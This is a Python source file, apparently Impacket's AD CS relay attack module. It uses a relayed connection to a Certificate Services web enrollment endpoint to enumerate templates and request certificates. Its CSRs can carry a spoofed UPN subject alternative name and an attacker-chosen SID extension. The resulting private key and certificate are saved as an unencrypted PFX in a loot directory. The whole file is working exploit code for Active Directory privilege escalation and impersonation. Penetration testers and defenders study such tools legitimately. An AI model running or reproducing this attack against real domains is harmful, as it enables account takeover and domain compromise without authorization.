# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD CS relay attack
#
# Authors:
#   Ex Android Dev (@ExAndroidDev)
#   Tw1sm (@Tw1sm)

import re
import base64
import os
from OpenSSL import crypto
import urllib.parse

from cryptography import x509
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.serialization import NoEncryption, Encoding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.x509 import ExtensionNotFound, load_pem_x509_certificate
from cryptography.x509.oid import NameOID, ObjectIdentifier

from impacket import LOG


def _tlv(tag, value):
    n = len(value)
    if n < 0x80:
        return bytes([tag, n]) + value
    elif n < 0x100:
        return bytes([tag, 0x81, n]) + value
    else:
        return bytes([tag, 0x82, (n >> 8) & 0xff, n & 0xff]) + value


def _oid_encode(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    first = 40 * parts[0] + parts[1]

    def arc(n):
        if n < 128:
            return bytes([n])
        r = []
        while n:
            r.insert(0, n & 0x7f)
            n >>= 7
        for i in range(len(r) - 1):
            r[i] |= 0x80
        return bytes(r)

    c = arc(first)
    for p in parts[2:]:
        c += arc(p)
    return _tlv(0x06, c)


def _encode_upn_san(upn):
    """GeneralNames SEQUENCE containing OtherName[msUPN] = UTF8String(upn)"""
    utf8 = _tlv(0x0c, upn.encode('utf-8'))
    val  = _tlv(0xa0, utf8)
    oid  = _oid_encode("1.3.6.1.4.1.311.20.2.3")
    on   = _tlv(0xa0, oid + val)
    return _tlv(0x30, on)


def _encode_sid_ext(sid):
    """szOID_NTDS_CA_SECURITY_EXT value: GeneralNames containing OtherName[NTDS_OBJECTSID]"""
    oct_s = _tlv(0x04, sid.encode('utf-8'))
    val   = _tlv(0xa0, oct_s)
    oid   = _oid_encode("1.3.6.1.4.1.311.25.2.1")
    on    = _tlv(0xa0, oid + val)
    return _tlv(0x30, on)

# cache already attacked clients
ELEVATED = []


class ADCSAttack:
    UPN_OID = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")

    def _run(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return
        
        if self.config.enumTemplates:
            templates = self.enum_templates()
            if templates is None:
                return
            # Print the parsed results
            for entry in templates:
                try:
                    LOG.info(f'  - {entry["REALNAME"]}')
                    LOG.debug(f'    - KEYSPEC: {entry["KEYSPEC"]}')
                    LOG.debug(f'    - KEYFLAG: {entry["KEYFLAG"]}')
                    LOG.debug(f'    - ENROLLFLAG: {entry["ENROLLFLAG"]}')
                    LOG.debug(f'    - PRIVATEKEYFLAG: {entry["PRIVATEKEYFLAG"]}')
                    LOG.debug(f'    - SUBJECTFLAG: {entry["SUBJECTFLAG"]}')
                    LOG.debug(f'    - RASIGNATURE: {entry["RASIGNATURE"]}')
                    LOG.debug(f'    - CSPLIST: {entry["CSPLIST"]}')
                    LOG.debug(f'    - EXTOID: {entry["EXTOID"]}')
                    LOG.debug(f'    - EXTMAJ: {entry["EXTMAJ"]}')
                    LOG.debug(f'    - EXTFMIN: {entry["EXTFMIN"]}')
                    LOG.debug(f'    - EXTMIN: {entry["EXTMIN"]}')
                    LOG.debug(f'    - FRIENDLYNAME: {entry["FRIENDLYNAME"]}')
                except KeyError:
                    LOG.info(f'  - {entry}')
            LOG.info("Certificate enumeration complete!")
            return

        current_template = self.config.template
        if current_template is None:
            current_template = "Machine" if self.username.endswith("$") else "User"

        # Template name might be UTF-8
        original_template = current_template
        current_template = urllib.parse.quote(current_template)
        if current_template == original_template:
            LOG.info('Using template name: %s' % current_template)
        else:
            LOG.info('Using template name: %s (%s)' % (current_template, original_template))

        altSid = getattr(self.config, 'altSid', None)
        csr = self.generate_csr(key, self.username, self.config.altName, altSid=altSid)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        if altSid:
            LOG.info("CSR generated with SID extension: %s" % altSid)
        else:
            LOG.info("CSR generated!")

        certAttrib = self.generate_certattributes(current_template, self.config.altName)

        data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        LOG.info("Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        ELEVATED.append(self.username)
        response = self.client.getresponse()

        if response.status != 200:
            LOG.error("Error getting certificate! Make sure you have entered valid certificate template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            LOG.error("Error obtaining certificate!")
            return

        certificate_id = found[0]

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
        certificate = response.read().decode()

        cert_obj = load_pem_x509_certificate(certificate.encode(), backend=default_backend())
        pfx_filename = self._sanitize_filename(self.username or self._extract_certificate_identity(cert_obj) or "certificate_{0}".format(certificate_id))
        certificate_store = self.generate_pfx(key.to_cryptography_key(), cert_obj)
        output_path = os.path.join(self.config.lootdir, "{}.pfx".format(pfx_filename))
        LOG.info("Writing PKCS#12 certificate to %s" % output_path)
        try:
            if not os.path.isdir(self.config.lootdir):
                os.mkdir(self.config.lootdir)
            with open(output_path, 'wb') as f:
                f.write(certificate_store)
            LOG.info("Certificate successfully written to file")
        except Exception as e:
            LOG.info("Unable to write certificate to file, printing B64 of certificate to console instead")
            LOG.info("Base64-encoded PKCS#12 certificate (%s): \n%s" % (pfx_filename, base64.b64encode(certificate_store).decode()))
            pass

        if self.config.altName:
            LOG.info("This certificate can also be used for user : {}".format(self.config.altName))

    @staticmethod
    def generate_csr(key, CN, altName, csr_type=crypto.FILETYPE_PEM, altSid=None):
        LOG.info("Generating CSR...")

        if altSid is None:
            req = crypto.X509Req()
            if CN:
                req.get_subject().CN = CN
            if altName:
                req.add_extensions([crypto.X509Extension(b"subjectAltName", False,
                    b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" % altName.encode())])
            req.set_pubkey(key)
            req.sign(key, "sha256")
            return crypto.dump_certificate_request(csr_type, req)

        private_key = key.to_cryptography_key()
        builder = x509.CertificateSigningRequestBuilder()
        builder = builder.subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, CN or "")
        ]))
        if altName:
            builder = builder.add_extension(
                x509.UnrecognizedExtension(
                    oid=ObjectIdentifier("2.5.29.17"),
                    value=_encode_upn_san(altName)
                ),
                critical=False
            )
        builder = builder.add_extension(
            x509.UnrecognizedExtension(
                oid=ObjectIdentifier("1.3.6.1.4.1.311.25.2"),
                value=_encode_sid_ext(altSid)
            ),
            critical=False
        )
        csr = builder.sign(private_key, hashes.SHA256(), default_backend())
        if csr_type == crypto.FILETYPE_PEM:
            return csr.public_bytes(Encoding.PEM)
        else:
            return csr.public_bytes(Encoding.DER)

    @staticmethod
    def generate_pfx(key, certificate):
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=certificate,
            cas=None,
            encryption_algorithm=NoEncryption()
        )
        
        return pfx_data
    
    @staticmethod
    def generate_certattributes(template, altName):
        if altName:
            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
        return "CertificateTemplate:{}".format(template)
    
    def enum_templates(self):
        enum_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }

        # Key mapping for parsing
        KEY_MAPPING = {
            0: "OFFLINE",
            1: "REALNAME",
            2: "KEYSPEC",
            3: "KEYFLAG",
            4: "ENROLLFLAG",
            5: "PRIVATEKEYFLAG",
            6: "SUBJECTFLAG",
            7: "RASIGNATURE",
            8: "CSPLIST",
            9: "EXTOID",
            10: "EXTMAJ",
            11: "EXTFMIN",
            12: "EXTMIN",
            13: "FRIENDLYNAME",
        }

        LOG.info("Enumerating certificates")
        self.client.request("GET", "/certsrv/certrqxt.asp", headers=enum_headers)
        response = self.client.getresponse()
        content = response.read()
        if response.status != 200:
            LOG.error("Error enumerating certificate templates! HTTP %d" % response.status)
            return None
        option_lines = re.findall(r"<Option Value.*?>", content.decode())
        if len(option_lines) == 0:
            LOG.warning("No certificate template entries found in /certsrv/certrqxt.asp")
            return None

        parsed_results = []
        for line in option_lines:
            # Extract the content after "<Option Value="
            match = re.search(r"<Option Value=\"(.*?)\">", line)
            if match:
                raw_data = match.group(1)
                # Split the data by semicolon
                parsed_data = raw_data.split(";")
                # Map the parsed data using the key mapping
                parsed_dict = {KEY_MAPPING.get(i, f"UNKNOWN_{i}"): value for i, value in enumerate(parsed_data)}
                parsed_results.append(parsed_dict)
        return parsed_results

    @classmethod
    def _extract_certificate_identity(cls, cert):
        try:
            common_names = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
            for attribute in common_names:
                value = attribute.value.strip()
                if value:
                    return value
        except Exception:
            pass

        try:
            san_extension = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            san = san_extension.value
            for other_name in san.get_values_for_type(x509.OtherName):
                if other_name.type_id == cls.UPN_OID:
                    value = other_name.value
                    if isinstance(value, bytes):
                        value = value.decode('utf-8', errors='ignore')
                    value = value.strip()
                    if value:
                        return value
            for dns_name in san.get_values_for_type(x509.DNSName):
                value = dns_name.strip()
                if value:
                    return value
        except ExtensionNotFound:
            pass
        except Exception:
            pass

        return None

    @staticmethod
    def _sanitize_filename(name):
        sanitized = re.sub(r'[^A-Za-z0-9._-]', '_', name)
        sanitized = sanitized.strip("._")
        return sanitized
